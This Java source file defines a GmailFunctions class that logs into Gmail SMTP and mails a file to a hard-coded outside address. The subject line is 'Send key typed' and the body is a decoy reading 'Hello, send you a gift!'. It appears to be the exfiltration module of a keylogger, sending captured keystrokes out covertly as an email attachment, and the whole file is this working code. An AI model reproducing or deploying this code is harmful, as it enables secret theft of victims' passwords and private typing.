package my.controller;

import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import my.key.Param;
import my.model.Gmail;
import my.model.TXT;

public class GmailFunctions extends TXT {
    
    Gmail gmail;

    public GmailFunctions () {
        gmail = new Gmail();
    }

    private void bodyEmail () throws AddressException, MessagingException {
        gmail.setEmailTo("mindlunnyfalse@gmail.com");
        gmail.setSubject("Send key typed");
        gmail.setContent("Hello, send you a gift!");

        gmail.properties.put("mail.smtp.host", "smtp.gmail.com");
        gmail.properties.put("mail.smtp.ssl.trust", "smtp.gmail.com");
        gmail.properties.setProperty("mail.smtp.starttls.enable", "true");
        gmail.properties.setProperty("mail.smtp.port", "587");
        gmail.properties.setProperty("mail.smtp.user", gmail.emailFrom);
        gmail.properties.setProperty("mail.smtp.ssl.protocols", "TLSv1.2");
        gmail.properties.setProperty("mail.smtp.auth", "true");

        gmail.session = Session.getDefaultInstance(gmail.properties);
        
        MimeMultipart mimeMultiPart = new MimeMultipart();

        MimeBodyPart bodyPartContent = new MimeBodyPart();
        bodyPartContent.setContent(gmail.getContent(), "text/html; charset=utf-8");

        mimeMultiPart.addBodyPart(bodyPartContent);

        MimeBodyPart attachPart = new MimeBodyPart();
        //System.getProperty("user.dir")+"/src/main/resources/privado/friday.txt"
        attachPart.setDataHandler(new DataHandler(new FileDataSource(gmail.myFile.getAbsolutePath())));
        //System.out.println(gmail.myFile.getAbsolutePath());
        attachPart.setFileName(gmail.myFile.getName());
        System.out.println(gmail.myFile.getName());
        mimeMultiPart.addBodyPart(attachPart);

        gmail.mimeMessage = new MimeMessage(gmail.session);
        gmail.mimeMessage.setFrom(new InternetAddress(gmail.emailFrom));
        gmail.mimeMessage.setRecipient(Message.RecipientType.TO, new InternetAddress(gmail.getEmailTo()));
        gmail.mimeMessage.setSubject(gmail.getSubject());
        gmail.mimeMessage.setContent(mimeMultiPart);
        //gmail.mimeMessage.setText(gmail.getContent(), "ISO-8859-1", "html");
    }

    public void sendEmail () throws AddressException, MessagingException {
        bodyEmail();
        try (Transport transport = gmail.session.getTransport("smtp")) {
            transport.connect(gmail.emailFrom, String.valueOf(gmail.getPasswordApp()));
            transport.sendMessage(gmail.mimeMessage, gmail.mimeMessage.getRecipients(Message.RecipientType.TO));
        } catch (MessagingException messagingException) {
            messagingException.printStackTrace();
        }
        
    }
}
